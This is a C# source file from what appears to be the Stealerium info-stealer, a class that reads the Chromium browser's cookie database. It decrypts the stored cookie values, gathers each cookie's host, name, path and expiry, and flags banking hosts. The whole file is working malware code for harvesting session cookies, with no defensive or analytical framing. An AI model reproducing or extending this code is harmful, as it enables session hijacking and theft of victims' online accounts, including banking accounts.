using System;
using System.Collections.Generic;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium;

internal sealed class Cookies
{
	public static List<Cookie> Get(string sCookie)
	{
		List<Cookie> list = new List<Cookie>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(sCookie, "cookies");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				Cookie cookie = default(Cookie);
				cookie.Value = Crypto.EasyDecrypt(sCookie, sqLite.GetValue(i, 12));
				Cookie item = cookie;
				if (item.Value == "")
				{
					item.Value = sqLite.GetValue(i, 3);
				}
				item.HostKey = Crypto.GetUtf8(sqLite.GetValue(i, 1));
				item.Name = Crypto.GetUtf8(sqLite.GetValue(i, 2));
				item.Path = Crypto.GetUtf8(sqLite.GetValue(i, 4));
				item.ExpiresUtc = Crypto.GetUtf8(sqLite.GetValue(i, 5));
				item.IsSecure = Crypto.GetUtf8(sqLite.GetValue(i, 6).ToUpper());
				Banking.ScanData(item.HostKey);
				Counter.Cookies++;
				list.Add(item);
			}
			return list;
		}
		catch (Exception ex)
		{
			Logging.Log("Chromium >> Failed collect cookies\n" + ex);
			return list;
		}
	}
}
